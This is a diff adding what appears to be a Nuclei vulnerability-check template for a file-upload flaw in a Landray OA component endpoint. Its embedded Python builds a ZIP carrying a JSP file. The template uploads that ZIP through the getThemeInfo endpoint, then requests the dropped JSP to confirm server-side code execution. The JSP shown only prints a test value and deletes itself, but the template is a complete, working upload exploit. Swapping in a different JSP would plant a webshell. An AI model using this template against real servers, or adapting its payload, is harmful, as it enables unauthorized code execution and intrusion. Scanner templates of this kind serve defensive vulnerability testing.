@@ -1,0 +1,76 @@
+id: landary-sysUiComponent-fileupload
+
+info:
+  name: landary-sysUiComponent-fileupload
+  author: msk
+  severity: high
+
+code:
+  - engine:
+      - py
+      - python3
+    source: |
+      #coding: u8
+      import base64
+      import io
+      import random
+      import string
+      import zipfile
+      
+      def create_zip_archive_base64():
+          zip_buffer = io.BytesIO()
+      
+          filename = "log.jsp"
+      
+          component_ini = "component.ini"
+      
+          content = "<% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>"
+          # 使用 zipfile 模块创建压缩包
+          with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED, False) as zip_file:
+      
+              zip_file.writestr(component_ini, "id=2023"+"\n"+"name=%s" % filename)
+      
+              zip_file.writestr(filename, content)
+      
+          # 获取压缩包的二进制数据
+          zip_data = zip_buffer.getvalue()
+          
+          # 使用 base64 模块进行编码
+          zip_base64 = base64.b64encode(zip_data).decode('utf-8')
+      
+          return zip_base64
+      print(create_zip_archive_base64())
+
+variables:
+  boundary: "{{to_lower(rand_base(20))}}"
+  filename: "{{to_lower(rand_base(20))}}"
+
+http:
+  - raw:
+      - |
+        POST /sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo&s_ajax=true HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: multipart/form-data; boundary={{boundary}}
+        
+        --{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.zip"
+        Content-Type: application/x-zip-compressed
+        
+        {{base64_decode(code_response)}}
+        --{{boundary}}--
+        
+
+      - |
+        GET /resource/ui-component/2023/log.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains_all(body_2,'12321')"
+# digest: 480a00453043021f5a7d11b22a51536831efd6feef6dc0ddb16972aa43031941fc8c02dd2ea9030220101deabe5f5ed7fcf491a98ef8fcf357d8ea46a558df5f3d76c1fac122e8c8ec:b03a20f46d43b0cd205c2383364aa75a
